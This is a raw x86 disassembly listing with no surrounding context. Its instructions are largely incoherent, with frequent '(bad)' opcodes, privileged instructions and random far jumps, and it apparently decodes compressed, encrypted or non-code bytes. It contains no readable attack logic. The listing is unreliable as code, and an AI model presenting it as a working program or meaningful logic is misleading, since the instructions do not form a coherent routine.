  41a529:	sub    DWORD PTR [edx-0x21cf8c7e],edx
  41a52f:	dec    ebx
  41a530:	fcom   DWORD PTR [ebp+0x8]
  41a533:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a534:	loopne 0x41a4e9
  41a536:	pop    es
  41a537:	mov    al,BYTE PTR [ebp+0x41d712df]
  41a53d:	aad    0xde
  41a53f:	jmp    0x6674:0xaba8272e
  41a546:	arpl   WORD PTR [edi],di
  41a548:	or     eax,0xc267c9db
  41a54d:	shr    BYTE PTR [ebp-0x59],1
  41a550:	sub    ebx,0xc8eb20e9
  41a556:	fiadd  WORD PTR [ebx-0x5e]
  41a559:	cmp    al,0x16
  41a55b:	sbb    BYTE PTR ds:[esi-0x59dc05c2],al
  41a562:	add    esp,esi
  41a564:	das    
  41a565:	icebp  
  41a566:	test   DWORD PTR [edi-0x50],edi
  41a569:	sub    eax,0x561c056
  41a56e:	das    
  41a56f:	enter  0x1195,0x3
  41a573:	mov    eax,ds:0xfb85edb2
  41a578:	add    al,0xda
  41a57a:	cmc    
  41a57b:	ror    DWORD PTR [ebp-0x372bdf37],1
  41a581:	ins    BYTE PTR es:[edi],dx
  41a582:	in     eax,0x15
  41a584:	mov    ebp,0x7559820f
  41a589:	mov    cl,0xe2
  41a58b:	push   cs
  41a58c:	mov    edi,0xcbb6848e
  41a591:	adc    esp,DWORD PTR [edx]
  41a593:	sti    
  41a594:	add    al,0xd7
  41a596:	xchg   BYTE PTR [ebx-0x2c],dl
  41a599:	imul   esi,DWORD PTR [eax],0xffffffe6
  41a59c:	movsx  eax,WORD PTR [ebx]
  41a59f:	sub    ebx,DWORD PTR [eax]
  41a5a1:	pushf  
  41a5a2:	add    eax,0x3786aab6
  41a5a7:	iret   
  41a5a8:	mov    bl,0x8f
  41a5aa:	(bad)  
  41a5ab:	repnz push eax
  41a5ad:	scas   eax,DWORD PTR es:[edi]
  41a5ae:	sbb    edi,DWORD PTR [eax]
  41a5b0:	or     bl,BYTE PTR [ebp-0x3e046708]
  41a5b6:	int    0xbb
  41a5b8:	push   0x6ee0839c
  41a5bd:	mov    edi,0xebd92164
  41a5c2:	inc    ecx
  41a5c3:	sbb    al,0xe2
  41a5c5:	push   esp
  41a5c6:	ds dec ebp
  41a5c8:	inc    eax
  41a5c9:	setg   bl
  41a5cc:	push   esp
  41a5cd:	cmp    DWORD PTR ds:0xe765942d,esi
  41a5d3:	(bad)  
  41a5d4:	push   edi
  41a5d5:	aam    0x30
  41a5d7:	and    eax,0xcc3a04d
  41a5dc:	call   0x6569:0x28218c60
  41a5e3:	repnz dec cl
  41a5e6:	js     0x41a5fb
  41a5e8:	in     al,dx
  41a5e9:	es pop ebp
  41a5eb:	mov    ah,0x63
  41a5ed:	fbstp  TBYTE PTR [ecx+0x3baa149d]
  41a5f3:	not    BYTE PTR [edi]
  41a5f5:	jmp    0x41a634
  41a5f7:	pop    edx
  41a5f8:	xchg   BYTE PTR [ecx-0x3d],bh
  41a5fb:	xchg   ecx,eax
  41a5fc:	push   esp
  41a5fd:	mov    ah,0xfb
  41a5ff:	mov    ebp,es
  41a601:	pushf  
  41a602:	dec    ecx
  41a603:	pop    es
  41a604:	xchg   ebx,eax
  41a605:	in     al,0x69
  41a607:	sbb    cl,BYTE PTR [edi]
  41a609:	mov    dl,0xe9
  41a60b:	mov    bh,0x14
  41a60d:	call   0x8496:0x54ed192c
  41a614:	cmp    ecx,DWORD PTR [ecx]
  41a616:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a617:	pop    ebp
  41a618:	mov    dl,ah
  41a61a:	sbb    BYTE PTR [eax+0x1d],bl
  41a61d:	sbb    cl,BYTE PTR [ebx+0x7b442131]
  41a623:	hlt    
  41a624:	ins    DWORD PTR es:[edi],dx
  41a625:	mov    al,0xe8
  41a627:	jmp    0x1d3a3e90
  41a62c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a62d:	imul   eax,DWORD PTR [ecx-0x47],0x341e7d62
  41a634:	add    eax,0x535c1887
  41a639:	cwde   
  41a63a:	sbb    eax,0x7bb9e797
  41a63f:	sbb    eax,0x7be9cde6
  41a644:	les    eax,FWORD PTR [edi-0xc]
  41a647:	adc    DWORD PTR [edx+ebx*8+0x7c],0xffffffcc
  41a64c:	(bad)  
  41a64d:	out    0xd5,al
  41a64f:	xchg   edi,eax
  41a650:	sti    
  41a651:	and    DWORD PTR [ebp-0x5b],ebp
  41a654:	sub    edx,DWORD PTR [ebp+0x2e]
  41a657:	ja     0x41a600
  41a659:	ret    
  41a65a:	add    bl,BYTE PTR [edi]
  41a65c:	fdiv   QWORD PTR [ebx+0x2c25f5c4]
  41a662:	scas   eax,DWORD PTR es:[edi]
  41a663:	out    0x2d,eax
  41a665:	mov    ebx,0xbb580f3c
  41a66a:	sub    BYTE PTR [eax+0x6546928e],cl
  41a670:	xor    DWORD PTR [edx-0x74],0xffffffb8
  41a674:	shl    BYTE PTR [edi-0x47e1ae0],cl
  41a67a:	xchg   ecx,ebx
  41a67c:	outs   dx,DWORD PTR ds:[esi]
  41a67d:	fucom  st(6)
  41a67f:	ret    
  41a680:	adc    al,0x58
  41a682:	stos   DWORD PTR es:[edi],eax
  41a683:	pop    edx
  41a684:	repnz or eax,0x5256060a
  41a68a:	adc    edi,eax
  41a68c:	(bad)  
  41a68d:	out    0x4d,eax
  41a68f:	adc    ebp,ebx
  41a691:	out    0xe5,al
  41a693:	add    ecx,edi
  41a695:	hlt    
  41a696:	xchg   DWORD PTR [edi+0xb937b6b],edi
  41a69c:	ins    DWORD PTR es:[edi],dx
  41a69d:	xchg   ecx,eax
  41a69e:	xchg   ecx,eax
  41a69f:	mov    ds:0x3015cfce,eax
  41a6a4:	mov    esp,0x1ba918ae
  41a6a9:	shl    DWORD PTR [ebx],cl
  41a6ab:	out    dx,eax
  41a6ac:	int    0x9f
  41a6ae:	(bad)  
  41a6af:	int3   
  41a6b0:	loope  0x41a6d8
  41a6b2:	stos   DWORD PTR es:[edi],eax
  41a6b3:	daa    
  41a6b4:	dec    ecx
  41a6b5:	sub    DWORD PTR [ebp+0x2e],ebp
  41a6b8:	cli    
  41a6b9:	mul    edx
  41a6bb:	dec    edi
  41a6bc:	or     eax,0xa95cdade
  41a6c1:	mov    al,ds:0x38b7728b
  41a6c6:	(bad)  
  41a6c7:	pop    ebp
  41a6c8:	adc    eax,0xd794e6a3
  41a6cd:	dec    esp
  41a6ce:	test   al,0x54
  41a6d0:	mov    edi,0x4a075530
  41a6d5:	sub    esi,ebx
  41a6d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6d8:	mov    esi,0x33ebe13d
  41a6dd:	adc    esi,DWORD PTR [ecx]
  41a6df:	or     BYTE PTR [eax+0x2c33169b],dl
  41a6e5:	cwde   
  41a6e6:	mov    ah,0x4c
  41a6e8:	imul   edx,edi,0x892793d4
  41a6ee:	(bad)  
  41a6f0:	push   edx
  41a6f1:	in     eax,0x9d
  41a6f3:	in     al,dx
  41a6f4:	dec    eax
  41a6f5:	lahf   
  41a6f6:	inc    edx
  41a6f7:	cmp    DWORD PTR [eax-0x3bb453e9],edx
  41a6fd:	push   ebp
  41a6fe:	ret    0x7231
  41a701:	mul    dh
  41a703:	xlat   BYTE PTR ds:[ebx]
  41a704:	fild   DWORD PTR [esi-0x3e8c948c]
  41a70a:	pop    es
  41a70b:	lods   al,BYTE PTR ds:[esi]
  41a70c:	loop   0x41a761
  41a70e:	test   eax,0x26a3a08b
  41a713:	rcl    DWORD PTR [esp+ebp*8-0x30],0xf8
  41a718:	mov    ebp,0x9c67888e
  41a71d:	stc    
  41a71e:	aaa    
  41a71f:	enter  0x2cdb,0xed
  41a723:	icebp  
  41a724:	test   BYTE PTR [ebp+0x76e38a0e],bh
  41a72a:	sub    al,BYTE PTR [ebp+0x73]
  41a72d:	ins    BYTE PTR es:[edi],dx
  41a72e:	in     eax,dx
  41a72f:	sub    al,0x48
  41a731:	hlt    
  41a732:	aam    0x6
  41a734:	iret   
  41a735:	sbb    dh,BYTE PTR [ebx-0x3a]
  41a738:	xchg   ebp,eax
  41a739:	lods   al,BYTE PTR ds:[esi]
  41a73a:	sbb    al,BYTE PTR [edx-0x19]
  41a73d:	jne    0x41a6eb
  41a73f:	adc    dl,BYTE PTR ds:0xbfb6a4ec
  41a745:	add    ecx,DWORD PTR [ebx-0x77]
  41a748:	in     eax,0x2
  41a74a:	sahf   
  41a74b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a74c:	sub    bl,BYTE PTR [edx-0x33]
  41a74f:	sbb    edi,DWORD PTR [ecx]
  41a751:	dec    eax
  41a752:	mov    ecx,esp
  41a754:	fwait
  41a755:	arpl   WORD PTR [eax],bp
  41a757:	js     0x41a6ed
  41a759:	jmp    0x843e:0x15306a8f
  41a760:	sahf   
  41a761:	adc    BYTE PTR [eax+0xf4f1f],al
  41a767:	pushf  
  41a768:	loope  0x41a79b
  41a76a:	sub    al,0x4e
  41a76c:	dec    esi
  41a76d:	cli    
  41a76e:	jmp    0xac1b:0xd140538c
  41a775:	sub    DWORD PTR [edx-0x3b135775],edx
  41a77b:	adc    al,0xba
  41a77d:	arpl   WORD PTR ds:0xb91e234a,ax
  41a783:	shr    BYTE PTR fs:[edi-0x13],0x24
  41a788:	ja     0x41a7ba
  41a78a:	jne    0x41a70d
  41a78c:	inc    ecx
  41a78d:	ror    BYTE PTR [ecx-0x12],1
  41a790:	into   
  41a791:	test   ebp,ebx
  41a793:	sbb    al,0xa
  41a795:	mov    ebp,0xb589d454
  41a79a:	(bad)  
  41a79b:	mov    ds:0x4905f847,eax
  41a7a0:	mov    cl,0xa7
  41a7a2:	inc    edx
  41a7a3:	fnstsw WORD PTR [esi+eiz*8-0x1e]
  41a7a7:	fidiv  WORD PTR [edx-0x617793f1]
  41a7ad:	cmc    
  41a7ae:	icebp  
  41a7af:	in     eax,dx
  41a7b0:	mov    ebx,0x3d828468
  41a7b5:	in     eax,dx
  41a7b6:	lods   eax,DWORD PTR ds:[esi]
  41a7b7:	xor    cl,al
  41a7b9:	or     eax,ebp
  41a7bb:	sbb    eax,0x44503c2c
  41a7c0:	imul   eax,DWORD PTR [edx],0x66020de7
  41a7c6:	je     0x41a773
  41a7c8:	fmul   QWORD PTR [ecx]
  41a7ca:	xchg   edi,eax
  41a7cb:	mov    esi,0xb69cec9
  41a7d0:	(bad)  
  41a7d1:	fcomp  DWORD PTR [ecx+0xd86a524]
  41a7d7:	scas   al,BYTE PTR es:[edi]
  41a7d8:	retf   0x3b90
  41a7db:	dec    ecx
  41a7dc:	push   es
  41a7dd:	dec    edx
  41a7de:	cs push edx
  41a7e0:	pusha  
  41a7e1:	sub    edi,eax
  41a7e3:	retf   
  41a7e4:	mov    ebp,0x1ef93a4c
  41a7e9:	jne    0x41a802
  41a7eb:	mov    ecx,DWORD PTR [ecx]
  41a7ed:	pop    eax
  41a7ee:	jmp    0xf1a:0x8a3a31c2
  41a7f5:	mov    db5,ebx
  41a7f8:	test   al,0xe4
  41a7fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a7fb:	mov    ?,WORD PTR [ecx]
  41a7fd:	or     eax,DWORD PTR [edx+0x67]
  41a800:	mov    ebx,0xba06096f
  41a805:	or     ebx,DWORD PTR [esi-0x53e06580]
  41a80b:	push   eax
  41a80c:	neg    DWORD PTR [ebx]
  41a80e:	retf   0x5cef
  41a811:	repnz mov ecx,DWORD PTR [ecx-0x1214f68d]
  41a818:	mov    al,ds:0x87f7ba7b
  41a81d:	les    esp,FWORD PTR [edx+0x128bf887]
  41a823:	adc    eax,0xa6c4702f
  41a828:	aaa    
  41a829:	sbb    BYTE PTR [ebx+0x31a348d0],0xee
  41a830:	sub    edi,ecx
  41a832:	ja     0x41a883
  41a834:	retf   
  41a835:	push   ss
  41a836:	sub    eax,0x1882b685
  41a83b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a83c:	scas   al,BYTE PTR es:[edi]
  41a83d:	or     ebx,esi
  41a83f:	jl     0x41a8b4
  41a841:	or     DWORD PTR [esi-0x2d],ecx
  41a844:	icebp  
  41a845:	pop    ecx
  41a846:	and    BYTE PTR [ebx+0x4a544bca],ch
  41a84c:	das    
  41a84d:	cmp    eax,0x96524e79
  41a852:	add    al,0x47
  41a854:	sar    DWORD PTR [edx+0x21],cl
  41a857:	jmp    0x41a871
  41a859:	pop    eax
  41a85a:	adc    BYTE PTR [ebp-0x4a],0x52
  41a85e:	mov    dl,0x1
  41a860:	inc    eax
  41a861:	mov    al,ds:0x54410c
  41a866:	int3   
  41a867:	cmp    BYTE PTR [ecx-0x6ebe4781],cl
  41a86d:	add    dh,BYTE PTR [edi+eax*8+0x4]
  41a871:	and    BYTE PTR [ebp-0x53bc4cdf],dh
  41a877:	call   0xc7fb:0x4d763dd9
  41a87e:	(bad)  
  41a87f:	mov    esi,0xc60a80b8
  41a884:	inc    BYTE PTR [ecx]
  41a886:	sbb    eax,0x31d12887
  41a88b:	out    0x68,eax
  41a88d:	scas   eax,DWORD PTR es:[edi]
  41a88e:	adc    BYTE PTR [eax+0x2db25a7b],dh
  41a894:	xor    eax,0x1e660e9e
  41a899:	push   esp
  41a89a:	test   BYTE PTR [ebx+0x5ab7481a],ch
  41a8a0:	inc    esp
  41a8a1:	(bad)  
  41a8a2:	ins    DWORD PTR es:[edi],dx
  41a8a3:	jae    0x41a885
  41a8a5:	mov    ah,0xbe
  41a8a7:	push   edx
  41a8a8:	cs ins DWORD PTR es:[edi],dx
  41a8aa:	pop    ss
  41a8ab:	popa   
  41a8ac:	sbb    edi,DWORD PTR [ebx-0x3deaefd1]
  41a8b2:	das    
  41a8b3:	dec    ebx
  41a8b4:	call   0x68d588e
  41a8b9:	retf   
  41a8ba:	cmp    ch,bh
  41a8bc:	inc    edi
  41a8bd:	rcr    BYTE PTR [edx+0x72],0xf0
  41a8c1:	sub    al,ch
  41a8c3:	out    dx,eax
  41a8c4:	cmp    BYTE PTR [ebx+eax*2],ch
  41a8c7:	push   esi
  41a8c8:	in     eax,dx
  41a8c9:	mov    ebx,0xffc7589c
  41a8ce:	and    cl,cl
  41a8d0:	test   eax,0x37176b42
  41a8d5:	mov    ecx,es
  41a8d7:	loopne 0x41a93d
  41a8d9:	ins    BYTE PTR es:[edi],dx
  41a8da:	idiv   dh
  41a8dc:	(bad)  
  41a8dd:	xor    esp,DWORD PTR [ebp+eax*4+0x5d]
  41a8e1:	mul    DWORD PTR [ebx]
  41a8e3:	inc    esp
  41a8e4:	scas   eax,DWORD PTR es:[edi]
  41a8e5:	mov    ch,0x97
  41a8e7:	or     DWORD PTR [ecx+esi*1],esp
  41a8ea:	loopne 0x41a887
  41a8ec:	mov    edx,0xf079b8a5
  41a8f1:	mov    ds:0x137ea8e5,al
  41a8f6:	into   
  41a8f7:	mov    edx,0xfcc9f7e0
  41a8fc:	stos   DWORD PTR es:[edi],eax
  41a8fd:	aaa    
  41a8fe:	mov    ah,0x27
  41a900:	xor    DWORD PTR [eax-0x5e924628],esp
  41a906:	aad    0x2d
  41a908:	inc    ebx
  41a909:	test   BYTE PTR [edx-0x34e4e1fb],bl
  41a90f:	cmp    eax,0x3ab162d0
  41a914:	pop    esi
  41a915:	jno    0x41a92a
  41a917:	mov    bh,0xd4
  41a919:	sbb    al,0xe
  41a91b:	pop    ebp
  41a91c:	lahf   
  41a91d:	adc    ebp,DWORD PTR [esp+edx*8-0x22c4be8d]
  41a924:	jecxz  0x41a8d2
  41a926:	mov    edi,0xb2ebd010
  41a92b:	pop    eax
  41a92c:	ins    BYTE PTR es:[edi],dx
  41a92d:	lock add ecx,esp
  41a930:	fild   DWORD PTR [eax+0x3c925db2]
  41a936:	pop    esp
  41a937:	and    ebx,ecx
  41a939:	xchg   DWORD PTR [eax],ebp
  41a93b:	arpl   WORD PTR [esi+0x1d],cx
  41a93e:	or     esi,DWORD PTR [ebp-0xb6ab587]
  41a944:	fsub   QWORD PTR [esi-0x260490ca]
  41a94a:	test   al,0x20
  41a94c:	push   ds
  41a94d:	ret    
  41a94e:	dec    esp
  41a94f:	sub    al,0x22
  41a951:	pop    ebp
  41a952:	dec    edi
  41a953:	mov    esp,0xeebd5403
  41a958:	nop
  41a959:	adc    DWORD PTR [ebx-0x6b],edx
  41a95c:	mov    dl,0x93
  41a95e:	xchg   ebx,eax
  41a95f:	inc    eax
  41a960:	mov    dl,0x23
  41a962:	push   ebp
  41a963:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a964:	sub    DWORD PTR [ecx-0x244a60cb],ebx
  41a96a:	lahf   
  41a96b:	mov    esp,0x79a6f5c8
  41a970:	mov    ecx,0x67ccfe71
  41a975:	push   ecx
  41a976:	jecxz  0x41a989
  41a978:	add    ebx,edi
  41a97a:	adc    eax,0xdd071904
  41a97f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a980:	sbb    cl,BYTE PTR [edi+esi*8+0x6b34ca08]
  41a987:	mov    ds:0x679f652d,al
  41a98c:	mov    al,ds:0xce5bbf21
  41a991:	adc    eax,0x6f858879
  41a996:	push   ecx
  41a997:	gs push eax
  41a999:	pushw  cs
  41a99b:	and    al,0xa8
  41a99d:	or     DWORD PTR [ebp-0x24561613],ebx
  41a9a3:	outs   dx,DWORD PTR ds:[esi]
  41a9a4:	test   eax,0x55ac383d
  41a9a9:	fcom   QWORD PTR [ebp+0x76]
  41a9ac:	sbb    eax,eax
  41a9ae:	in     eax,0xae
  41a9b0:	sub    DWORD PTR [ebx+0x3d42ca0],0x52
  41a9b7:	push   ds
  41a9b8:	or     eax,DWORD PTR [esi]
  41a9ba:	js     0x41a9d9
  41a9bc:	sub    ebx,DWORD PTR [esi+0x2c9321a8]
  41a9c2:	adc    BYTE PTR [eax+0x5e],cl
  41a9c5:	int3   
  41a9c6:	jae    0x41a9d0
  41a9c8:	xchg   ebp,eax
  41a9c9:	cmp    eax,0x1e53a840
  41a9ce:	pop    edi
  41a9cf:	(bad)  
  41a9d0:	cwde   
  41a9d1:	hlt    
  41a9d2:	inc    esi
  41a9d3:	add    ebp,edx
  41a9d5:	push   ss
  41a9d6:	(bad)  
  41a9d7:	stos   DWORD PTR es:[di],eax
  41a9d9:	in     eax,dx
  41a9da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a9db:	jb     0x41a979
  41a9dd:	adc    bh,BYTE PTR [ebx-0x1]
  41a9e0:	pushf  
  41a9e1:	xchg   ebx,eax
  41a9e2:	push   ecx
  41a9e3:	bound  edx,QWORD PTR [ebp+0xb]
  41a9e6:	or     eax,0xd3bdc5ba
  41a9eb:	jno    0x41a9a2
  41a9ed:	and    eax,0x7c4cf70
  41a9f2:	ret    
  41a9f3:	dec    edx
  41a9f4:	popf   
  41a9f5:	(bad)  
  41a9f6:	fldcw  WORD PTR [eax+ebx*1-0x21b18b49]
  41a9fd:	inc    edx
  41a9fe:	scas   al,BYTE PTR es:[edi]
  41a9ff:	cmp    al,0xb2
  41aa01:	mov    esp,0xe1e87bf6
  41aa06:	(bad)  
  41aa07:	xchg   ecx,eax
  41aa08:	cdq    
  41aa09:	push   esi
  41aa0a:	cmp    eax,0xd6c44893
  41aa0f:	call   0x9719:0xbdbdb915
  41aa16:	xchg   ecx,eax
  41aa17:	ins    DWORD PTR es:[edi],dx
  41aa18:	add    dh,BYTE PTR [eax-0x780dca1b]
  41aa1e:	iret   
  41aa1f:	pop    eax
  41aa20:	add    al,0x7d
  41aa22:	test   BYTE PTR [edi],0x57
  41aa25:	and    dh,BYTE PTR [edx]
  41aa27:	(bad)  
  41aa28:	frstor [edx]
  41aa2a:	jo     0x41aa8c
  41aa2c:	fucomp st(3)
  41aa2e:	mov    eax,ds:0x1b04a403
  41aa33:	push   ebp
  41aa34:	dec    edx
  41aa35:	or     al,0xd8
  41aa37:	push   edi
  41aa38:	add    al,0x43
  41aa3a:	retf   
  41aa3b:	retf   0x1531
  41aa3e:	repnz pop ecx
  41aa40:	ror    DWORD PTR [ebx-0x569be135],cl
  41aa46:	cli    
  41aa47:	jae    0x41aa88
  41aa49:	dec    esp
  41aa4a:	adc    BYTE PTR fs:[ebp-0x30b23bbe],ch
  41aa51:	xchg   edx,eax
  41aa52:	mov    DWORD PTR [esi+0x67786570],edi
  41aa58:	iret   
  41aa59:	imul   DWORD PTR [ecx+0x6b]
  41aa5c:	or     al,0xf6
  41aa5e:	jge    0x41aa77
  41aa60:	in     eax,0x2a
  41aa62:	retf   
  41aa63:	fs add BYTE PTR es:[ecx+0x4a],dh
  41aa68:	push   0xffffff9f
  41aa6a:	jns    0x41aa36
  41aa6c:	and    eax,eax
  41aa6e:	inc    ebx
  41aa6f:	mov    BYTE PTR [ebx-0x30aa51fb],bh
  41aa75:	test   DWORD PTR [esi-0x30],esp
  41aa78:	nop
  41aa79:	fild   QWORD PTR [esi-0x25]
  41aa7c:	fsub   DWORD PTR [esi-0x32f412b4]
  41aa82:	sbb    al,BYTE PTR [ebp+ebp*1-0x7900f15d]
  41aa89:	int3   
  41aa8a:	add    ebp,DWORD PTR [edx-0x7c]
  41aa8d:	mov    edi,0xdcccb14b
  41aa92:	loopne 0x41aada
  41aa94:	mov    ch,ah
  41aa96:	outs   dx,DWORD PTR ds:[esi]
  41aa97:	jle    0x41aa48
  41aa99:	fwait
  41aa9a:	cmc    
  41aa9b:	and    bl,bl
  41aa9d:	add    DWORD PTR [esi+eiz*1-0x25],0x766c2de0
  41aaa5:	fnstcw WORD PTR [edx]
  41aaa7:	push   edi
  41aaa8:	xchg   ebx,eax
  41aaa9:	inc    eax
  41aaaa:	call   0x6868ceb3
  41aaaf:	arpl   WORD PTR [edi+0xe],dx
  41aab2:	sub    BYTE PTR [ebx],al
  41aab4:	xchg   esi,eax
  41aab5:	or     al,0x48
  41aab7:	add    eax,0x42030db1
  41aabc:	stos   DWORD PTR es:[edi],eax
  41aabd:	ins    BYTE PTR es:[edi],dx
  41aabe:	push   esp
  41aabf:	sub    cl,BYTE PTR [edx]
  41aac1:	int3   
  41aac2:	sbb    eax,0xa5057c5
  41aac7:	mov    ds,WORD PTR [edx+0x78]
  41aaca:	push   ebp
  41aacb:	xchg   ecx,eax
  41aacc:	ss push esi
  41aace:	xchg   ecx,eax
  41aacf:	jmp    0x41aa97
  41aad1:	enter  0x66d7,0xec
  41aad5:	jnp    0x41aa8c
  41aad7:	inc    edx
  41aad8:	adc    DWORD PTR [esp+esi*4],ecx
  41aadb:	jg     0x41ab07
  41aadd:	adc    eax,DWORD PTR [esi+0x679fa9d]
  41aae3:	xor    BYTE PTR [ecx-0x336c4be5],cl
  41aae9:	out    dx,al
  41aaea:	loopne 0x41ab17
  41aaec:	mov    eax,ds:0xce312179
  41aaf1:	sub    bh,bl
  41aaf3:	jp     0x41ab3d
  41aaf5:	cwde   
  41aaf6:	pop    edx
  41aaf7:	push   0x6c
  41aaf9:	rcr    ebx,1
  41aafb:	in     al,0x87
  41aafd:	mov    ebx,0x947410b0
  41ab02:	or     eax,0xc6bbdd2c
  41ab07:	in     eax,dx
  41ab08:	mov    ds:0xa00a5267,eax
  41ab0d:	jne    0x41aae5
  41ab0f:	test   DWORD PTR [esi],ecx
  41ab11:	xor    DWORD PTR [edx+0x26],ebp
  41ab14:	fst    QWORD PTR [ebp-0x54324ac3]
  41ab1a:	dec    edi
  41ab1b:	mov    dl,0x7e
  41ab1d:	mov    cl,0xae
  41ab1f:	xor    eax,0x55051623
  41ab24:	mov    cl,0x5e
  41ab26:	or     dh,BYTE PTR [edx]
  41ab28:	neg    edx
  41ab2a:	xchg   ebp,eax
  41ab2b:	xchg   ebx,eax
  41ab2c:	mov    cl,0x79
  41ab2e:	or     al,0x17
  41ab30:	das    
  41ab31:	addr16 dec ebx
  41ab33:	and    eax,0xa2e69428
  41ab38:	(bad)  
  41ab39:	jp     0x41ab7e
  41ab3b:	out    0xd8,al
  41ab3d:	mov    ah,0x97
  41ab3f:	lock scas al,BYTE PTR es:[edi]
  41ab41:	jmp    0x41aaeb
  41ab43:	xor    bh,BYTE PTR [ebp+0xe]
  41ab46:	sub    ch,ch
  41ab48:	cmc    
  41ab49:	push   ds
  41ab4a:	lods   eax,DWORD PTR ds:[esi]
  41ab4b:	pop    ecx
  41ab4c:	test   edx,ebx
  41ab4e:	outs   dx,DWORD PTR ds:[esi]
  41ab4f:	lock cmp BYTE PTR es:[eax-0x320b247b],bl
  41ab57:	fstp   QWORD PTR ss:[edi]
  41ab5a:	mov    dl,0xab
  41ab5c:	test   eax,0xe2d7cadb
  41ab61:	push   ss
  41ab62:	and    al,0x72
  41ab64:	pusha  
  41ab65:	loope  0x41ab5a
  41ab67:	sub    bl,BYTE PTR [ebx]
  41ab69:	les    esp,FWORD PTR [edx]
  41ab6b:	jp     0x41abce
  41ab6d:	dec    ebp
  41ab6e:	sub    BYTE PTR [edi-0x1b3797ef],ch
  41ab74:	inc    esi
  41ab75:	mov    dh,0x2d
  41ab77:	push   edi
  41ab78:	adc    dl,BYTE PTR [ebx+esi*8-0x26]
  41ab7c:	loopne 0x41ab9e
  41ab7e:	mov    edi,0x8ab37e85
  41ab83:	leave  
  41ab84:	or     DWORD PTR ds:0x28f4ee84,esi
  41ab8a:	and    ch,BYTE PTR [esp+ecx*8-0x612fbdae]
  41ab91:	cmp    ebp,DWORD PTR [esi]
  41ab93:	mov    ds:0x21cd6556,al
  41ab98:	cmc    
  41ab99:	mov    esp,0xc9d8e6d9
  41ab9e:	hlt    
  41ab9f:	push   esp
  41aba0:	sahf   
  41aba1:	cmp    BYTE PTR [edi-0x63],0x43
  41aba5:	jge    0x41ab95
  41aba7:	pop    ebx
  41aba8:	test   eax,0xb37aab1e
  41abad:	cmp    DWORD PTR [ecx],0xc916207a
  41abb3:	and    al,0x5e
  41abb5:	or     DWORD PTR [ecx],edi
  41abb7:	jp     0x41ab9a
  41abb9:	jle    0x41ac21
  41abbb:	push   0x7efc1f13
  41abc0:	xchg   edx,eax
  41abc1:	mov    ah,0x76
  41abc3:	inc    eax
  41abc4:	mov    ebx,0x5f3690ce
  41abc9:	outs   dx,BYTE PTR ds:[esi]
  41abca:	push   ds
  41abcb:	lods   eax,DWORD PTR ds:[esi]
  41abcc:	inc    ecx
  41abcd:	mov    bh,0xc3
  41abcf:	or     cl,cl
  41abd1:	stos   BYTE PTR es:[edi],al
  41abd2:	stos   BYTE PTR es:[edi],al
  41abd3:	hlt    
  41abd4:	xor    BYTE PTR [edx-0x4472ccc0],cl
  41abda:	dec    ecx
  41abdb:	call   0xa690:0x7bdcdd30
  41abe2:	aad    0xb0
  41abe4:	jns    0x41ac0f
  41abe6:	fidivr DWORD PTR [edi+0x5fea4c16]
  41abec:	cli    
  41abed:	jge    0x41ab8e
  41abef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41abf0:	outs   dx,DWORD PTR ds:[esi]
  41abf1:	mov    ebp,0xbf0dd5b9
  41abf6:	xchg   DWORD PTR [ecx+0x66],ecx
  41abf9:	xor    DWORD PTR [edx],esp
  41abfb:	push   edx
  41abfc:	test   eax,0xed53f852
  41ac01:	gs ror dh,cl
  41ac04:	stos   BYTE PTR es:[edi],al
  41ac05:	adc    DWORD PTR [ebp+0x65],ebp
  41ac08:	inc    esp
  41ac09:	xchg   edx,eax
  41ac0a:	mov    ds:0x63f92e68,al
  41ac0f:	jmp    0xe94e:0x468f9738
  41ac16:	dec    eax
  41ac17:	push   0xffffffcd
  41ac19:	std    
  41ac1a:	push   edx
  41ac1b:	fldenv [ecx-0x160eb11d]
  41ac21:	add    DWORD PTR [edi],0xdfaa08a2
  41ac27:	xchg   esp,eax
  41ac28:	stos   BYTE PTR es:[edi],al
  41ac29:	xchg   esi,eax
  41ac2a:	cmp    dl,BYTE PTR [eax]
  41ac2c:	mov    esi,0xb5751561
  41ac31:	xchg   edi,eax
  41ac32:	mov    al,0xc0
  41ac34:	fdivr  st,st(5)
  41ac36:	sub    DWORD PTR [ebp+0x455bbb5b],esi
  41ac3c:	dec    edx
  41ac3d:	in     al,0xfb
  41ac3f:	mov    WORD PTR [esi],cs
  41ac41:	stos   DWORD PTR es:[edi],eax
  41ac42:	lea    edx,[ecx-0x41]
  41ac45:	pop    edx
  41ac46:	add    DWORD PTR [ebp+0x1c906d53],ecx
  41ac4c:	mov    eax,ds:0x64717f5
  41ac51:	mov    ebp,0x64029972
  41ac56:	push   ds
  41ac57:	jl     0x41ac7b
  41ac59:	arpl   di,ax
  41ac5b:	xor    al,0x6d
  41ac5d:	and    eax,0x9216e02a
  41ac62:	xor    ah,ch
  41ac64:	cdq    
  41ac65:	jns    0x41abf3
  41ac67:	aad    0x40
  41ac69:	pop    ebx
  41ac6a:	xchg   ebx,eax
  41ac6b:	das    
  41ac6c:	or     al,0xde
  41ac6e:	pop    ecx
  41ac6f:	je     0x41ac69
  41ac71:	call   0x734f0f2a
  41ac76:	add    al,0xef
  41ac78:	out    dx,al
  41ac79:	jp     0x41ac37
  41ac7b:	retf   
  41ac7c:	jmp    0x6286:0x8368cbf6
  41ac83:	mov    eax,0xefa67e72
  41ac88:	jb     0x41ac6c
  41ac8a:	popf   
  41ac8b:	xchg   ebx,eax
  41ac8c:	scas   al,BYTE PTR es:[edi]
  41ac8d:	jmp    0xcde8:0x923dc7bd
  41ac94:	(bad)  
  41ac95:	and    al,0xd9
  41ac97:	outs   dx,DWORD PTR ds:[esi]
  41ac98:	jge    0x41aca8
  41ac9a:	cmp    eax,0x3aeb12db
  41ac9f:	cld    
  41aca0:	enter  0x8274,0x40
  41aca4:	or     BYTE PTR [ebx+edi*1],bl
  41aca7:	xchg   edi,eax
